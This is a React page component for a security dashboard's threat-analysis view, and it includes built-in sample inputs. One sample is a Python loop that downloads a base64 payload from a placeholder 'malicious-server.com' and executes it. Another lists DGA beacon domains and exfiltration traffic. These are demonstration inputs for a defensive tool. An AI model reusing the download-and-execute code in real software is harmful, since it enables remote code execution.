import { useState } from 'react';
import axios from 'axios';
import { useAuth } from '../context/AuthContext';
import { motion } from 'framer-motion';
import { 
  Cpu, 
  Search, 
  AlertTriangle, 
  CheckCircle, 
  Clock,
  Zap,
  Brain,
  Shield,
  Bug,
  Network,
  FileCode,
  Activity
} from 'lucide-react';
import { Button } from '../components/ui/button';
import { Textarea } from '../components/ui/textarea';
import { Badge } from '../components/ui/badge';
import { ScrollArea } from '../components/ui/scroll-area';
import { 
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue 
} from '../components/ui/select';
import { Progress } from '../components/ui/progress';
import { toast } from 'sonner';
import SeraphPageHeader from '../components/SeraphPageHeader';

const envBackendUrl = (process.env.REACT_APP_BACKEND_URL || '').trim();
const API = !envBackendUrl || envBackendUrl === 'undefined' || envBackendUrl === 'null'
  ? '/api'
  : `${envBackendUrl.replace(/\/+$/, '')}/api`;

const AI_ACCENTS = {
  magenta: { border: 'rgba(239,68,68,0.34)', glow: 'rgba(239,68,68,0.12)', text: '#fecaca', meta: '#fef3f3', icon: '#EF4444' }, // neon_red
  violet: { border: 'rgba(6,182,212,0.34)', glow: 'rgba(6,182,212,0.12)', text: '#ccfbf6', meta: '#e0faf9', icon: '#06B6D4' }, // cyan
  gold: { border: 'rgba(245,158,11,0.34)', glow: 'rgba(245,158,11,0.12)', text: '#fef9c3', meta: '#fefce8', icon: '#F59E0B' }, // neon_amber
  green: { border: 'rgba(16,185,129,0.34)', glow: 'rgba(16,185,129,0.12)', text: '#d1fae5', meta: '#a7f3d0', icon: '#10B981' }, // neon_green
};

const aiPanelStyle = (accent) => ({
  background: 'linear-gradient(160deg, rgba(8,18,34,0.92), rgba(3,9,18,0.96))',
  border: `1px solid ${accent.border}`,
  boxShadow: `0 0 14px ${accent.glow}, inset 0 0 8px rgba(255,255,255,0.02)`,
  borderRadius: '14px',
});

const aiRiskTheme = (score) => {
  if (score >= 75) return { hex: '#ff7a66', border: 'rgba(255,122,102,0.34)', bg: 'rgba(255,122,102,0.08)' };
  if (score >= 50) return { hex: '#ffb366', border: 'rgba(255,179,102,0.34)', bg: 'rgba(255,179,102,0.08)' };
  if (score >= 25) return { hex: '#ffd166', border: 'rgba(255,209,102,0.32)', bg: 'rgba(255,209,102,0.07)' };
  return { hex: '#7ce2a3', border: 'rgba(124,226,163,0.28)', bg: 'rgba(124,226,163,0.07)' };
};

const AnalysisTypeCard = ({ type, icon: Icon, label, description, selected, onSelect }) => (
  <button
    onClick={() => onSelect(type)}
    className="p-4 rounded border text-left transition-all duration-200"
    style={selected ? aiPanelStyle(AI_ACCENTS.magenta) : aiPanelStyle(AI_ACCENTS.violet)}
    data-testid={`analysis-type-${type}`}
  >
    <div className="flex items-center gap-3 mb-2">
      <div
        className="w-8 h-8 rounded flex items-center justify-center"
        style={{
          background: selected ? 'rgba(255,138,217,0.18)' : 'rgba(197,162,235,0.12)',
          border: selected ? '1px solid rgba(255,138,217,0.34)' : '1px solid rgba(197,162,235,0.22)',
        }}
      >
        <Icon className="w-4 h-4" style={{ color: selected ? AI_ACCENTS.magenta.icon : AI_ACCENTS.violet.icon }} />
      </div>
      <span className="font-medium text-sm" style={{ color: selected ? AI_ACCENTS.magenta.text : '#f5fbff' }}>
        {label}
      </span>
    </div>
    <p className="sophia-terminal-meta text-xs">{description}</p>
  </button>
);

const ResultIndicator = ({ label, value, color }) => (
  <div
    className="flex items-center justify-between p-3 rounded"
    style={aiPanelStyle(color === 'green' ? AI_ACCENTS.green : color === 'cyan' ? AI_ACCENTS.violet : AI_ACCENTS.magenta)}
  >
    <span className="sophia-terminal-label text-sm">{label}</span>
    <span
      className="sophia-flicker sophia-terminal-value font-bold"
      style={{ color: color === 'green' ? AI_ACCENTS.green.text : color === 'cyan' ? AI_ACCENTS.violet.text : AI_ACCENTS.magenta.text }}
    >
      {value}
    </span>
  </div>
);

const AIDetectionPage = () => {
  const { getAuthHeaders } = useAuth();
  const [analysisType, setAnalysisType] = useState('threat_detection');
  const [content, setContent] = useState('');
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState(null);
  const [analysisHistory, setAnalysisHistory] = useState([]);

  const analysisTypes = [
    {
      type: 'threat_detection',
      icon: AlertTriangle,
      label: 'Threat Detection',
      description: 'Identify malicious code, attack vectors, and security threats'
    },
    {
      type: 'behavior_analysis',
      icon: Brain,
      label: 'Behavior Analysis',
      description: 'Detect AI/bot patterns and non-human behaviors'
    },
    {
      type: 'malware_scan',
      icon: Bug,
      label: 'Malware Scan',
      description: 'Analyze for polymorphic malware and zero-day threats'
    },
    {
      type: 'pattern_recognition',
      icon: Network,
      label: 'Pattern Recognition',
      description: 'Identify attack campaigns and threat actor signatures'
    }
  ];

  const handleAnalyze = async () => {
    if (!content.trim()) {
      toast.error('Please enter content to analyze');
      return;
    }

    setLoading(true);
    setResult(null);

    try {
      const response = await axios.post(
        `${API}/ai/analyze`,
        {
          content: content,
          analysis_type: analysisType
        },
        { headers: getAuthHeaders() }
      );

      setResult(response.data);
      setAnalysisHistory(prev => [response.data, ...prev.slice(0, 9)]);
      toast.success('Analysis complete');
    } catch (error) {
      console.error('Analysis error:', error);
      toast.error(error.response?.data?.detail || 'Analysis failed');
    } finally {
      setLoading(false);
    }
  };

  const sampleContent = {
    threat_detection: `import requests
import subprocess
import base64

def execute_payload(url):
    response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'})
    payload = base64.b64decode(response.text)
    subprocess.Popen(['python', '-c', payload.decode()], shell=True)
    
# C2 server communication
while True:
    execute_payload('http://malicious-server.com/payload')`,
    behavior_analysis: `Request Log Analysis:
Timestamp: 2024-01-15T14:23:45.123Z - Endpoint: /api/data - Response: 200 - Duration: 2.003ms
Timestamp: 2024-01-15T14:23:45.126Z - Endpoint: /api/data - Response: 200 - Duration: 2.001ms
Timestamp: 2024-01-15T14:23:45.129Z - Endpoint: /api/data - Response: 200 - Duration: 2.002ms
Timestamp: 2024-01-15T14:23:45.132Z - Endpoint: /api/data - Response: 200 - Duration: 2.001ms

Pattern: Exactly 3ms intervals, sub-millisecond consistency in response handling.
Source: 192.168.1.100 - 500 requests in 1.5 seconds`,
    malware_scan: `PE Header Analysis:
MD5: a3b4c5d6e7f8g9h0i1j2k3l4m5n6o7p8
Import Table: kernel32.dll, advapi32.dll, ws2_32.dll
Suspicious Strings: "VirtualAllocEx", "CreateRemoteThread", "NtUnmapViewOfSection"
Entropy: Section .text - 7.89 (High entropy suggests packing)
Anti-Debug: IsDebuggerPresent, NtQueryInformationProcess detected`,
    pattern_recognition: `Network Traffic Analysis:
- DNS queries to DGA-generated domains: xk7m9.evil.com, p2r4t.evil.com
- Beacon interval: 5 minutes ± 30 seconds (jitter)
- Data exfiltration: 2.3MB encoded data to port 443
- Certificate: Self-signed, CN=Microsoft Corporation (FAKE)
- Similar pattern observed in APT-29 campaigns`
  };

  return (
    <div className="p-6 lg:p-8 space-y-6" data-testid="ai-detection-page" data-accent="magenta">
      <SeraphPageHeader
        eyebrow="seraph · ai-detection · live signals"
        title="AI Detection Engine"
        tagline="> advanced threat analysis powered by GPT-5.2"
        accent="magenta"
        status="ENGINE ACTIVE"
      />

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Left Panel - Analysis Input */}
        <div className="lg:col-span-2 space-y-6">
          {/* Analysis Type Selection */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="p-5"
            style={aiPanelStyle(AI_ACCENTS.magenta)}
          >
            <h3 className="sophia-terminal-heading mb-4" style={{ color: AI_ACCENTS.magenta.text }}>Analysis Type</h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
              {analysisTypes.map((type) => (
                <AnalysisTypeCard
                  key={type.type}
                  {...type}
                  selected={analysisType === type.type}
                  onSelect={setAnalysisType}
                />
              ))}
            </div>
          </motion.div>

          {/* Content Input */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.1 }}
            className="p-5"
            style={aiPanelStyle(AI_ACCENTS.violet)}
          >
            <div className="flex items-center justify-between mb-4">
              <h3 className="sophia-terminal-heading" style={{ color: AI_ACCENTS.violet.text }}>Content to Analyze</h3>
              <Button
                variant="ghost"
                size="sm"
                className="sophia-terminal-meta hover:text-white"
                onClick={() => setContent(sampleContent[analysisType])}
                data-testid="load-sample-btn"
              >
                <FileCode className="w-4 h-4 mr-2" />
                Load Sample
              </Button>
            </div>
            <Textarea
              value={content}
              onChange={(e) => setContent(e.target.value)}
              placeholder="Paste code, logs, network data, or any content for threat analysis..."
              className="min-h-[250px] text-white font-mono text-sm placeholder:text-slate-600"
              style={{ background: 'rgba(3,9,18,0.94)', borderColor: 'rgba(197,162,235,0.3)' }}
              data-testid="analysis-content-input"
            />
            <div className="flex items-center justify-between mt-4">
              <span className="sophia-terminal-meta text-xs">
                {content.length} characters
              </span>
              <Button
                onClick={handleAnalyze}
                disabled={loading || !content.trim()}
                className="btn-tactical"
                style={{ background: 'linear-gradient(135deg, #ff8ad9, #c5a2eb)', color: '#071018' }}
                data-testid="analyze-btn"
              >
                {loading ? (
                  <span className="flex items-center gap-2">
                    <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    Analyzing...
                  </span>
                ) : (
                  <span className="flex items-center gap-2">
                    <Search className="w-4 h-4" />
                    Run Analysis
                  </span>
                )}
              </Button>
            </div>
          </motion.div>

          {/* Analysis Result */}
          {result && (
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              className="overflow-hidden"
              style={aiPanelStyle(aiRiskTheme(result.risk_score))}
            >
              {/* Result Header */}
              <div className="p-4" style={{ borderBottom: `1px solid ${aiRiskTheme(result.risk_score).border}`, background: aiRiskTheme(result.risk_score).bg }}>
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    {result.risk_score >= 50 ? (
                      <AlertTriangle className="w-5 h-5" style={{ color: aiRiskTheme(result.risk_score).hex }} />
                    ) : (
                      <CheckCircle className="w-5 h-5 text-green-400" />
                    )}
                    <h3 className="sophia-terminal-heading" style={{ color: aiRiskTheme(result.risk_score).hex }}>Analysis Result</h3>
                  </div>
                  <Badge style={{ background: aiRiskTheme(result.risk_score).bg, color: aiRiskTheme(result.risk_score).hex, border: `1px solid ${aiRiskTheme(result.risk_score).border}` }}>
                    Risk Score: {result.risk_score.toFixed(0)}%
                  </Badge>
                </div>
              </div>

              {/* Risk Score Progress */}
              <div className="p-5" style={{ borderBottom: `1px solid ${aiRiskTheme(result.risk_score).border}` }}>
                <div className="flex items-center justify-between mb-2">
                  <span className="sophia-terminal-label text-sm">Threat Level</span>
                  <span className="sophia-flicker sophia-terminal-value text-sm" style={{ color: aiRiskTheme(result.risk_score).hex }}>
                    {result.risk_score >= 75 ? 'CRITICAL' : result.risk_score >= 50 ? 'HIGH' : result.risk_score >= 25 ? 'MEDIUM' : 'LOW'}
                  </span>
                </div>
                <div className="h-2 bg-slate-800 rounded-full overflow-hidden">
                  <div 
                    className="h-full transition-all duration-500"
                    style={{ width: `${result.risk_score}%`, background: `linear-gradient(90deg, ${aiRiskTheme(result.risk_score).hex}, rgba(255,255,255,0.9))` }}
                  />
                </div>
              </div>

              {/* Analysis Content */}
              <div className="p-5">
                <h4 className="sophia-terminal-heading mb-3" style={{ color: AI_ACCENTS.violet.text }}>Analysis Details</h4>
                <ScrollArea className="h-64">
                  <div className="rounded p-4 font-mono text-sm whitespace-pre-wrap" style={{ background: 'rgba(3,9,18,0.88)', border: '1px solid rgba(197,162,235,0.18)', color: '#dfeffd' }}>
                    {result.result}
                  </div>
                </ScrollArea>
              </div>

              {/* Threat Indicators */}
              {result.threat_indicators?.length > 0 && (
                <div className="p-5" style={{ borderTop: `1px solid ${aiRiskTheme(result.risk_score).border}` }}>
                  <h4 className="sophia-terminal-heading mb-3" style={{ color: AI_ACCENTS.gold.text }}>Threat Indicators</h4>
                  <div className="flex flex-wrap gap-2">
                    {result.threat_indicators.map((indicator, i) => (
                      <Badge key={i} variant="outline" style={{ color: '#ffd7a1', borderColor: 'rgba(255,209,102,0.3)' }}>
                        {indicator}
                      </Badge>
                    ))}
                  </div>
                </div>
              )}

              {/* Recommendations */}
              {result.recommendations?.length > 0 && (
                <div className="p-5" style={{ borderTop: `1px solid ${aiRiskTheme(result.risk_score).border}` }}>
                  <h4 className="sophia-terminal-heading mb-3" style={{ color: AI_ACCENTS.green.text }}>Recommendations</h4>
                  <ul className="space-y-2">
                    {result.recommendations.map((rec, i) => (
                      <li key={i} className="flex items-start gap-2 text-sm sophia-terminal-meta">
                        <Shield className="w-4 h-4 mt-0.5 flex-shrink-0" style={{ color: '#7ce2a3' }} />
                        {rec}
                      </li>
                    ))}
                  </ul>
                </div>
              )}
            </motion.div>
          )}
        </div>

        {/* Right Panel - Info & History */}
        <div className="space-y-6">
          {/* Engine Status */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.2 }}
            className="p-5"
            style={aiPanelStyle(AI_ACCENTS.green)}
          >
            <h3 className="sophia-terminal-heading mb-4" style={{ color: AI_ACCENTS.green.text }}>Engine Status</h3>
            <div className="space-y-3">
              <ResultIndicator label="Model" value="GPT-5.2" color="blue" />
              <ResultIndicator label="Status" value="Online" color="green" />
              <ResultIndicator label="Latency" value="<100ms" color="cyan" />
            </div>
          </motion.div>

          {/* Detection Capabilities */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.3 }}
            className="p-5"
            style={aiPanelStyle(AI_ACCENTS.gold)}
          >
            <h3 className="sophia-terminal-heading mb-4" style={{ color: AI_ACCENTS.gold.text }}>Detection Capabilities</h3>
            <ul className="space-y-3">
              {[
                { label: 'AI Agent Detection', desc: 'Turing test inversion' },
                { label: 'Code Analysis', desc: 'Malicious pattern detection' },
                { label: 'Behavior Profiling', desc: 'Non-human timing analysis' },
                { label: 'Zero-Day Prediction', desc: 'Evolutionary pattern matching' }
              ].map((cap, i) => (
                <li key={i} className="flex items-start gap-3">
                  <CheckCircle className="w-4 h-4 text-green-400 mt-0.5" />
                  <div>
                    <p className="sophia-flicker sophia-terminal-value text-sm" style={{ fontSize: '0.92rem', color: '#fff6de' }}>{cap.label}</p>
                    <p className="sophia-terminal-meta text-xs">{cap.desc}</p>
                  </div>
                </li>
              ))}
            </ul>
          </motion.div>

          {/* Recent Analyses */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.4 }}
            className="p-5"
            style={aiPanelStyle(AI_ACCENTS.violet)}
          >
            <h3 className="sophia-terminal-heading mb-4" style={{ color: AI_ACCENTS.violet.text }}>Recent Analyses</h3>
            {analysisHistory.length > 0 ? (
              <ScrollArea className="h-48">
                <div className="space-y-2">
                  {analysisHistory.map((item, i) => (
                    <div key={i} className="p-3 rounded" style={{ background: 'rgba(8,20,38,0.78)', border: '1px solid rgba(197,162,235,0.18)' }}>
                      <div className="flex items-center justify-between mb-1">
                        <span className="sophia-terminal-meta text-xs capitalize">
                          {item.analysis_type.replace('_', ' ')}
                        </span>
                        <Badge 
                          variant="outline" 
                          style={{ color: aiRiskTheme(item.risk_score).hex, borderColor: aiRiskTheme(item.risk_score).border }}
                        >
                          {item.risk_score.toFixed(0)}%
                        </Badge>
                      </div>
                      <p className="sophia-terminal-meta text-xs">
                        {new Date(item.timestamp).toLocaleString()}
                      </p>
                    </div>
                  ))}
                </div>
              </ScrollArea>
            ) : (
              <div className="text-center py-8 sophia-terminal-meta">
                <Activity className="w-8 h-8 mx-auto mb-2 opacity-50" />
                <p className="text-sm">No analyses yet</p>
              </div>
            )}
          </motion.div>
        </div>
      </div>
    </div>
  );
};

export default AIDetectionPage;
